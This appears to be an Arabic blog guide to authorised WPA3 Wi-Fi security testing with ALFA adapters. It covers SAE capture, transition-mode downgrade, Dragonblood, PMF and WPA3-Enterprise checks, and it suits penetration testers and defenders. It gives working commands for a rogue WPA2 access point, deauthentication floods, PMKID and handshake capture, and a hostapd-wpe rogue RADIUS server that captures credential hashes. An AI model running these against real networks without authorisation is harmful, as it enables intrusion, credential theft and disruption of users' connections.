---
title: "اختبار أمان WPA3 باستخدام محولات ALFA (2026)"
description: "دليل شامل لاختبار أمان WPA3 باستخدام محولات ALFA Network. يغطي تحليل مصافحة SAE، وثغرات Dragonblood، وهجمات تخفيض وضع الانتقال، وتطبيق PMF، واختبار WPA3-Enterprise EAP."
date: 2026-03-24
draft: false
showBreadcrumbs: true
showTableOfContents: true
tags: ["WPA3", "SAE", "dragonblood", "transition-mode", "PMF", "kali-linux", "ALFA-network", "penetration-testing"]
featureimage: "/images/blog/wpa3-security-testing-alfa-2026.webp"
author: "benny-lai"
lastmod: 2026-07-02
faq:
  - question: "ما الفرق بين WPA3 و WPA2 في اختبار الأمن؟"
    answer: "يستخدم WPA3 مصافحة SAE بدلاً من PSK، يوفر سرية أمامية ولا يمكن مهاجمته بقاموس دون اتصال. PMF إلزامي، لكن وضع التحويل يُدخل سطح هجوم تخفيض."
  - question: "هل يمكن كسر مصافحة SAE دون اتصال بعد التقاطها؟"
    answer: "لا. شبكة SAE النقية لا تنتج قيمة قابلة للكسر. التقاط إطارات SAE للتحليل على مستوى البروتوكول فقط، لتأكيد النوع الصحيح والتفاوض على PMF."
  - question: "ما هجوم تخفيض وضع تحويل WPA3؟"
    answer: "نقطة الوصول في وضع التحويل تقبل SAE و PSK معاً. يُزوّر المهاجم نقطة وصول WPA2 نقية، إذا لم يُلزم العميل SAE يكتمل التخفيض وتُكسر المصافحة دون اتصال."
  - question: "هل أحتاج محول 6 GHz لاختبار WPA3؟"
    answer: "فقط لاختبار شبكات WPA3 على نطاق 6 GHz يحتاج AWUS036AXML. اختبار WPA3 على 2.4/5 GHz يستخدم AWUS036ACH."
  - question: "هل ما زالت ثغرات Dragonblood تحتاج اختباراً؟"
    answer: "برامج ثابت AP الحديثة رقّعت معظمها، لكن البيئات ببرامج ثابتة قديمة أو غير مُرقّعة ما زالت تحتاج اختبار CVE-2019-9494 لهجمات القناة الجانبية وفيضان SAE commit DoS."
---
{{< alert "triangle-exclamation" >}}
**تنبيه قانوني:** يجب إجراء جميع اختبارات أمان الشبكات اللاسلكية فقط على الشبكات والأجهزة التي حصلت فيها على تفويض صريح وموثق كتابيًا. تخضع تقنيات اختبار WPA3، بما فيها التقاط SAE وإلغاء المصادقة ونشر نقاط الوصول المارقة، للمتطلبات القانونية ذاتها المنطبقة على أي نشاط تقييم لاسلكي آخر. الاختبار المصرح به فقط.
{{< /alert >}}

{{< tldr >}}
اختبار أمن WPA3 يشمل تحليل مصافحة SAE وهجوم تخفيض وضع التحويل وتقييم ثغرات Dragonblood وإلزام PMF. AWUS036AXML لاختبار 6 GHz، و AWUS036ACH لاختبار 2.4/5 GHz.
{{< /tldr >}}


يُمثِّل WPA3 تحسينًا جوهريًا على WPA2 في أمان الشبكات اللاسلكية الشخصية والمؤسسية على حدٍّ سواء. فبروتوكول المصادقة المتزامنة بين الأنداد (SAE) يحلّ محل مصافحة المفتاح المشترك مسبقًا (PSK) بتبادل مفاتيح مصادقة بكلمة مرور يُقاوم هجمات القاموس خارج الإنترنت. كما أن إطارات الإدارة المحمية (PMF) إلزامية، والسرية التامة للأمام مدمجة.

غير أن WPA3 لا يخلو من ثغرات. كشف بحث Dragonblood (2019) عن ثغرات هجمات القنوات الجانبية وحجب الخدمة في تنفيذ مصافحة SAE. يُدخل وضع الانتقال سطوح هجوم التخفيض. وتواجه عمليات النشر المؤسسية نفس نقاط ضعف التحقق من صحة شهادات 802.1X المعروفة في WPA2-Enterprise. يغطي هذا الدليل منهجية اختبار أمان WPA3 الكاملة باستخدام محولات ALFA Network، التي توفر استقرار وضع المراقبة وقدرة الحقن اللازمين للتقييم الشامل.

---

## أساسيات WPA3 لمختبري الأمان

### SAE: المصادقة المتزامنة بين الأنداد

يحلّ SAE محل المصافحة الرباعية في WPA2-PSK بتبادل إثبات معرفة صفري مستند إلى بروتوكول تبادل مفاتيح Dragonfly. الخاصية الجوهرية المهمة لاختبار الأمان هي **السرية التامة للأمام**: حتى لو تعرضت كلمة مرور Wi-Fi للاختراق لاحقًا، لا يمكن فك تشفير حركة المرور الملتقطة سابقًا. وهذا يُلغي القيمة الأساسية لاختراق عبارة المرور خارج الإنترنت ضد شبكة SAE فقط.

يُلغي SAE أيضًا قابلية التعرض لهجمات PMKID التي أثّرت في WPA2. لا يوجد أي أثر قابل للاختراق خارج الإنترنت يمكن لمهاجم سلبي استخراجه من ارتباط SAE.

### PMF: إلزامي في WPA3

إطارات الإدارة المحمية 802.11w إلزامية في WPA3. إطارات إلغاء المصادقة والفصل محمية تشفيريًا، مما يمنع هجمات deauth المزيفة التي تُنجَز بسهولة تامة ضد شبكات WPA2 دون PMF. الشبكة WPA3-only يجب أن تكون محصّنة ضد التقاط المصافحة المُعجَّل بإلغاء المصادقة.

### وضع انتقال WPA3

سيناريو النشر الأكثر شيوعًا في الواقع هو **وضع انتقال WPA3**: تقبل نقطة الوصول مصادقة WPA3-SAE وWPA2-PSK في آنٍ واحد للحفاظ على التوافق مع الأجهزة التي لا تدعم WPA3. هذا الوضع هو سطح الهجوم الرئيسي في البيئات المؤسسية الحالية — إذ يُعيد تقديم نقطة ضعف مصافحة PSK لـ WPA2 على شبكة تُعلن عن WPA3.

### WPA3-Enterprise

يُلزم WPA3-Enterprise بوضع أمان 192 بت باستخدام GCMP-256 وHMAC-SHA-384، مع مصادقة متبادلة مستندة إلى الشهادات. يُعالج نفس نقاط ضعف التحقق من صحة الشهادة الموجودة في WPA2-Enterprise إذا لم يُنشر بصورة صحيحة. منهجية الاختبار لطبقة 802.1X مغطاة في [إطار تقييم أمان الشبكات اللاسلكية المؤسسية](/ar/blog/enterprise-wireless-security-assessment/).

---

## بيئة الاختبار ومتطلبات المحولات

### اختيار المحول

يتطلب اختبار WPA3 محولاً بوضع مراقبة موثوق ودعم حقن، وللشبكات WPA3 على 6 GHz — قدرة ثلاثية النطاق:

- **AWUS036AXML** — ضروري لشبكات WPA3 على Wi-Fi 6E (6 GHz). شريحة Mediatek MT7921AUN. دعم كامل لوضع المراقبة والحقن على Kali Linux مع نواة 5.18+. المحول ALFA الوحيد الذي يغطي قنوات 6 GHz حيث تتزايد عمليات نشر WPA3-only.
- **AWUS036ACH** — مناسب لاختبار WPA3 على 2.4/5 GHz. شريحة RTL8812AU. أقصى توافق مع سلسلة أدوات aircrack-ng وأوسع دعم لمشغّلات الأجهزة عبر إصدارات Kali Linux.

### تفعيل وضع المراقبة

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0

# Verify monitor interface
iwconfig wlan0mon
```

للاطلاع على دليل كامل لإعداد وضع المراقبة، راجع [تفعيل وضع المراقبة على Kali Linux](/ar/blog/enable-monitor-mode-kali-linux/).

### تحديد شبكات WPA3 في نتائج الفحص

```bash
# Passive scan across all bands
sudo airodump-ng wlan0mon --band abg -w wpa3_scan

# Filter for WPA3 networks in results
sudo airodump-ng wlan0mon --band abg | grep -i "SAE\|WPA3"
```

في مخرجات airodump-ng، تظهر شبكات WPA3-SAE بعبارة `WPA3 SAE` في عمود AUTH. تُظهر شبكات وضع الانتقال `WPA2 WPA3 SAE PSK`. تُظهر الشبكات المحسّنة المفتوحة (OWE) عبارة `OWE`.

---

## المرحلة 1: التقاط مصافحة SAE وتحليلها

### قيود الالتقاط السلبي

على خلاف WPA2، **لا يمكن استخدام مصافحات SAE لهجمات القاموس خارج الإنترنت**. التقاط إطارات SAE commit وconfirm أمر سهل مع أي محول في وضع المراقبة، لكن المواد الملتقطة لا تُنتج تجزئة قابلة للاختراق. الغرض من التقاط إطارات SAE هو التحليل على مستوى البروتوكول — التحقق من أن المتغير الصحيح من SAE قيد الاستخدام، وتأكيد أن PMF مُتفاوَض عليها، وتقديم الأدلة في تقرير التقييم.

```bash
# Capture on the target AP channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w sae_capture wlan0mon

# Analyze the capture in Wireshark
# Filter: wlan.bssid == aa:bb:cc:dd:ee:ff && wlan.fc.type_subtype == 0x000b
# (0x000b = Authentication frame)
wireshark -r sae_capture-01.cap
```

في إطارات المصادقة، تحقق من تبادل SAE commit وconfirm. يجب أن يُظهر عنصر معلومات RSN في إطارات Beacon:
- **AKM Suite**: 00-0F-AC:8 (SAE) لـ WPA3-Personal
- **PMF**: Required (MFPR bit set in RSN Capabilities)

### اختبار PMKID على شبكات SAE

ستحاول أدوات مثل `hcxdumptool` استخراج PMKID من جميع الشبكات، لكن شبكات SAE لا تُكشف عن PMKID قابلة للاختراق. تشغيل الأداة مفيد لتأكيد غياب نقطة ضعف PMKID في WPA2:

```bash
# Attempt PMKID capture — SAE networks should yield no crackable PMKID
sudo hcxdumptool -i wlan0mon -o wpa3_pmkid.pcapng --enable_status=3

# Convert and inspect
hcxpcapngtool -o wpa3_hashes.hc22000 wpa3_pmkid.pcapng

# An empty or absent hash file confirms no WPA2 PMKID exposure
wc -l wpa3_hashes.hc22000
```

إذا أنتجت `hcxpcapngtool` ملف `.hc22000` مليئًا بالبيانات لشبكة مُعلَن عنها بوصفها WPA3-only، يُشير ذلك إلى أن نقطة الوصول تعمل في وضع الانتقال وتُكشف عن PMKID في WPA2 — وهذا اكتشاف مهم.

---

## المرحلة 2: اختبار هجوم تخفيض وضع الانتقال

### سطح هجوم التخفيض

وضع انتقال WPA3 هو أكثر ثغرات WPA3 تأثيرًا في البيئات المؤسسية الحالية. عندما تعمل نقطة الوصول في وضع الانتقال، تقبل ارتباطات SAE وPSK على حدٍّ سواء. يمكن للمهاجم الذي يستطيع مراقبة طلبات Probe الخاصة بالعملاء أن يصنع نقطة وصول مارقة تُقدِّم قدرات WPA2-PSK فقط لنفس الـ SSID — إذا اتصل العميل دون اشتراط SAE، يُلتقط مصافحة WPA2 الرباعية القياسية ويمكن مهاجمتها خارج الإنترنت.

### إجراء الاختبار

```bash
# Step 1: Confirm the target is in transition mode (shows WPA2+WPA3 in airodump-ng)
sudo airodump-ng wlan0mon --band abg | grep "TARGET_SSID"

# Step 2: Capture the legitimate AP's beacon to note its channel and configuration
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w transition_recon wlan0mon

# Step 3: Create a WPA2-only rogue AP on the same channel using hostapd
# Create /tmp/rogue_wpa2.conf:
cat > /tmp/rogue_wpa2.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=TARGET_SSID
channel=6
hw_mode=g
wpa=2
wpa_passphrase=TestPassphrase123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

sudo hostapd /tmp/rogue_wpa2.conf &

# Step 4: Monitor for client associations on the rogue AP
sudo airodump-ng -c 6 --bssid ROGUE_BSSID -w downgrade_capture wlan0mon
```

**اكتشاف Critical:** إذا اقترن عميل سبق اتصاله عبر SAE بنقطة الوصول المارقة الخاصة بـ WPA2-only (يتجلى ذلك بمصافحة رباعية في ملف الالتقاط)، فإن نظام تشغيل العميل لا يُطبِّق اشتراط WPA3-SAE. يُمثِّل ذلك هجوم تخفيض ناجحًا.

**حالة النجاح:** يتجاهل العميل نقطة الوصول الخاصة بـ WPA2-only أو يعرض تنبيهًا، ولا يُكمل مصافحة WPA2.

### مؤشر التخفيض في مخرجات hcxpcapngtool

```bash
# Convert rogue AP capture — presence of hash confirms WPA2 association occurred
hcxpcapngtool -o downgrade_hash.hc22000 downgrade_capture-01.cap
cat downgrade_hash.hc22000
# Non-empty output = downgrade attack succeeded
```

---

## المرحلة 3: تقييم ثغرة Dragonblood

### الخلفية

حدّد بحث Dragonblood (Vanhoef & Ronen, 2019) ثغرات متعددة في تنفيذ مصافحة SAE:

- **CVE-2019-9494 / CVE-2019-9496**: هجمات القنوات الجانبية (المستندة إلى الذاكرة المؤقتة وإلى التوقيت) ضد إطار SAE commit، مما يُتيح هجمات القاموس خارج الإنترنت ضد التطبيقات غير المُرقَّعة
- **CVE-2019-9499**: تجاوز تأكيد SAE مما يُفضي إلى تخفيض WPA3-Personal إلى WPA2-PSK
- **حجب الخدمة عبر إغراق SAE commit**: استنزاف جداول حالة نقطة الوصول بإرسال أعداد كبيرة من إطارات SAE commit

رقَّعت معظم برامج ثابتة لنقاط الوصول الحديثة الثغرات الأصلية في Dragonblood. غير أن الاختبار بحثًا عنها لا يزال ذا صلة في البيئات ذات البرامج الثابتة القديمة أو غير المُرقَّعة.

### اختبار رمز مكافحة الإغراق في SAE

يتضمن WPA3-SAE آلية مكافحة إغراق لمنع حجب الخدمة عبر إغراق commit. اختبر ما إذا كانت نقطة الوصول المستهدفة تُطبِّق مكافحة الإغراق بصورة صحيحة:

```bash
# Install hcxtools
sudo apt install hcxtools

# Use hcxdumptool to observe SAE commit/confirm frame exchange rate limiting
sudo hcxdumptool -i wlan0mon -o dragonblood_test.pcapng --enable_status=3

# In Wireshark, filter for Authentication frames and observe:
# wlan.fc.type_subtype == 0x000b
# Look for Anti-Clogging Token (ACT) responses in commit frames
wireshark -r dragonblood_test.pcapng
```

في نقطة الوصول المُطبَّقة بصورة صحيحة، يجب أن تُشغِّل طلبات SAE commit السريعة من عناوين MAC مصدر متعددة استجابات Anti-Clogging Token (تُعيد نقطة الوصول رمزًا يجب تضمينه في إطارات commit اللاحقة). نقاط الوصول التي لا تُطبِّق ACT عرضة لحجب الخدمة عبر إغراق SAE commit.

### التحقق من إصدار البرنامج الثابت لنقطة الوصول

إصدار البرنامج الثابت مؤشر قوي على حالة التصحيح. قارن إصدار البرنامج الثابت المكتشف بنشرات أمان المورّد:

- Cisco: Security Advisory cisco-sa-wpa3-sae-side-channel (2019)
- Aruba: ArubaOS 8.6+ يُرقِّع Dragonblood
- Ubiquiti: UniFi Network 6.0+ يُرقِّع Dragonblood
- MikroTik: RouterOS 6.45.7+ يُرقِّع Dragonblood

وثِّق إصدار البرنامج الثابت لنقطة الوصول في تقرير التقييم. يجب الإشارة إلى نقطة وصول تعمل ببرنامج ثابت أقدم من هذه الإصدارات بوصفها احتمالاً ضعيفًا بصرف النظر عن تأكيد الاستغلال الفعلي.

---

## المرحلة 4: اختبار تطبيق PMF على شبكات WPA3

### لماذا لا يزال اختبار PMF مطلوبًا

على الرغم من أن PMF إلزامية في WPA3، فإن اختبار سلوك التطبيق الفعلي مهم لأن:

1. قد تكون PMF في نقاط وصول وضع الانتقال معينة على "capable" بدلاً من "required" في مسار WPA2، مما يُتيح هجمات deauth ضد العملاء المتصلين عبر WPA2
2. قد يُفضي سوء تعيين نقطة الوصول إلى عدم التفاوض على PMF حتى في ارتباطات SAE
3. قد لا تُطبِّق تطبيقات العملاء PMF بصورة صحيحة حتى عندما تُعلن نقطة الوصول عنها بوصفها إلزامية

### اختبار إلغاء المصادقة

```bash
# Attempt deauth against a test client associated via WPA3-SAE
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon

# Expected result on a correctly configured WPA3 network:
# - Test client does NOT disconnect (PMF-protected management frames dropped)
# - airodump-ng shows no handshake captured

# Failure condition (finding):
# - Test client disconnects and reassociates
# - airodump-ng captures a new handshake
```

### PMF Capable مقابل Required

تحقق من عنصر معلومات RSN في إطارات Beacon لتأكيد تعيين PMF:

```bash
# Capture beacon frames and decode RSN IE
sudo tshark -i wlan0mon -f "wlan type mgt subtype beacon and wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.capabilities.mfpc -e wlan_mgt.rsn.capabilities.mfpr \
  -c 5 2>/dev/null
```

تفسير المخرجات:
- `1,1` — PMF Required (MFPR=1, MFPC=1): صحيح لـ WPA3
- `1,0` — PMF Capable لكن ليس Required: اكتشاف Medium على شبكات WPA3، وHigh على SSIDs المؤسسية
- `0,0` — PMF Disabled: اكتشاف High على أي شبكة مُعلَن عنها بـ WPA3؛ يُشير إلى سوء تعيين نقطة الوصول

---

## المرحلة 5: اختبار OWE (التشفير اللاسلكي الانتهازي)

### نظرة عامة على OWE

OWE (Wi-Fi Enhanced Open) هو بديل WPA3 للشبكات الضيوف المفتوحة كليًا (غير المشفرة). يُجري OWE تبادل مفاتيح Diffie-Hellman غير مُوثَّق لإنشاء تشفير لكل جلسة دون الحاجة إلى كلمة مرور. يحمي من التنصت السلبي على الشبكات الضيوف لكنه لا يوفر مصادقة.

### اختبار وضع انتقال OWE

تنشر كثير من نقاط الوصول OWE في وضع الانتقال إلى جانب SSID مفتوح قديم (يكون SSID المفتوح مخفيًا وOWE SSID مرئيًا). اختبر ما إذا كان يمكن إجبار العملاء على الاتصال بـ SSID المفتوح القديم:

```bash
# Scan for hidden SSIDs paired with OWE networks
sudo airodump-ng wlan0mon --band abg | grep -E "OWE|\<length: 0\>"

# A hidden SSID with no encryption paired with an OWE SSID is the transition SSID
# Clients with WPA3 support should prefer OWE; legacy clients fall back to open
```

**اكتشاف:** إذا اتصل عميل قادر على WPA3 بـ SSID الانتقال المفتوح بدلاً من OWE SSID، فإن نظام تشغيل العميل لا يُعالج وضع انتقال OWE بصورة صحيحة. جميع حركة مرور هذا العميل غير مشفرة.

---

## المرحلة 6: تقييم WPA3-Enterprise

### التحقق من وضع الأمان بـ 192 بت

يُلزم WPA3-Enterprise بتشفير GCMP-256 ومصادقة HMAC-SHA-384 في وضع الأمان بـ 192 بت. تحقق عبر RSN IE في إطارات Beacon:

```bash
# Capture and decode RSN IE for enterprise SSID
sudo tshark -i wlan0mon -f "wlan type mgt subtype beacon and wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.pcs.type -e wlan_mgt.rsn.akms.type \
  -c 10 2>/dev/null
```

القيم المتوقعة لـ WPA3-Enterprise 192 بت:
- **Pairwise Cipher Suite**: GCMP-256 (00-0F-AC:9)
- **AKM Suite**: EAP-SHA384 (00-0F-AC:12) أو FT-EAP-SHA384 (00-0F-AC:13)

وجود CCMP-128 على شبكة WPA3-Enterprise هو اكتشاف Medium؛ نقطة الوصول لا تُطبِّق اشتراط الأمان بـ 192 بت.

### اختبار RADIUS المارق

WPA3-Enterprise عرضة لهجمات RADIUS المارقة إذا لم يتحقق العملاء من صحة شهادة الخادم. منهجية الاختبار مطابقة لـ WPA2-Enterprise:

```bash
# Deploy rogue AP with rogue RADIUS using hostapd-wpe
sudo apt install hostapd-wpe

# Edit /etc/hostapd-wpe/hostapd-wpe.conf for target SSID and channel
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Monitor for captured credential hashes
```

للاطلاع على إجراء اختبار EAP/RADIUS الكامل، راجع [إطار تقييم أمان الشبكات اللاسلكية المؤسسية](/ar/blog/enterprise-wireless-security-assessment/).

---

## مرجع مجموعة الأدوات لاختبار WPA3

<div class="table-nowrap" style="overflow-x: auto;">

| الأداة | الغرض | المحول | الأمر الرئيسي |
|---|---|---|---|
| airodump-ng | اكتشاف شبكات WPA3، التقاط إطارات SAE | AWUS036AXML / AWUS036ACH | `sudo airodump-ng wlan0mon --band abg` |
| hcxdumptool | التقاط PMKID/SAE، الكشف عن وضع الانتقال | AWUS036AXML | `sudo hcxdumptool -i wlan0mon -o out.pcapng --enable_status=3` |
| hcxpcapngtool | تحويل الملتقطات، الكشف عن نقطة ضعف WPA2 في وضع الانتقال | N/A (post-processing) | `hcxpcapngtool -o hash.hc22000 cap.pcapng` |
| Wireshark / tshark | تحليل RSN IE، قدرة PMF، فحص إطارات SAE | أي محول (عبر ملف الالتقاط) | `tshark -i wlan0mon -T fields -e wlan_mgt.rsn.capabilities.mfpr` |
| aireplay-ng | اختبار تطبيق PMF (deauth) | AWUS036ACH | `sudo aireplay-ng --deauth 10 -a BSSID wlan0mon` |
| hostapd | نقطة وصول مارقة بـ WPA2-only لاختبار التخفيض | AWUS036ACH | `sudo hostapd /tmp/rogue_wpa2.conf` |
| hostapd-wpe | RADIUS مارق لاختبار EAP في WPA3-Enterprise | AWUS036ACH | `sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf` |

</div>

---

## ملخص الاكتشافات لتقييمات WPA3

| المعرّف | الخطورة | الاكتشاف | الحالة |
|---|---|---|---|
| W3-01 | Critical | نجح تخفيض WPA3 إلى WPA2؛ التُقطت المصافحة وهي قابلة للاختراق | اقترن العميل بنقطة الوصول المارقة WPA2-only؛ استُردّت التجزئة |
| W3-02 | High | وضع الانتقال دون تطبيق SAE؛ نقطة ضعف PMKID في WPA2 مكشوفة | hcxpcapngtool تُعيد تجزئة قابلة للاختراق من شبكة WPA3 |
| W3-03 | High | PMF غير مُطبَّقة على SSID بـ WPA3؛ نجح هجوم deauth | قطع aireplay-ng اتصال عميل الاختبار |
| W3-04 | High | عملاء WPA3-Enterprise يقبلون RADIUS مارقًا دون تحذير شهادة | hostapd-wpe يلتقط بيانات اعتماد EAP من عميل الاختبار |
| W3-05 | Medium | PMF Capable لكن ليس Required على SSID بـ WPA3 | RSN IE يُظهر MFPC=1, MFPR=0 |
| W3-06 | Medium | WPA3-Enterprise لا تستخدم وضع الأمان بـ 192 بت | RSN IE يُظهر CCMP-128 بدلاً من GCMP-256 |
| W3-07 | Medium | البرنامج الثابت لنقطة الوصول أقدم من تصحيحات Dragonblood | مقارنة إصدار البرنامج الثابت بنشرات أمان المورّد |
| W3-08 | Low | وضع انتقال OWE؛ العملاء القدامى يتصلون دون تشفير | SSID مفتوح مرئي إلى جانب OWE SSID |

---

{{< faq >}}

## موارد ذات صلة

- [تقييم أمان الشبكات اللاسلكية المؤسسية: إطار عمل شامل](/ar/blog/enterprise-wireless-security-assessment/)
- [دليل حقن الحزم: اختبار محول WiFi باستخدام aireplay-ng](/ar/blog/packet-injection-guide/)
- [تفعيل وضع المراقبة على Kali Linux](/ar/blog/enable-monitor-mode-kali-linux/)

## المراجع

1. [ورقة بحث Dragonblood الرسمية (Vanhoef & Ronen, 2019)](https://papers.mathyvanhoef.com/dragonblood.pdf)
2. [شرح Wi-Fi Alliance لشهادة WPA3](https://www.wi-fi.org/discover-wi-fi/wpa3)
3. [وثائق aircrack-ng الرسمية](https://www.aircrack-ng.org/documentation.html)
4. [وثائق أداة hcxdumptool](https://github.com/ZerBea/hcxdumptool)
5. [معيار IEEE 802.11w PMF](https://standards.ieee.org/ieee/802.11/)
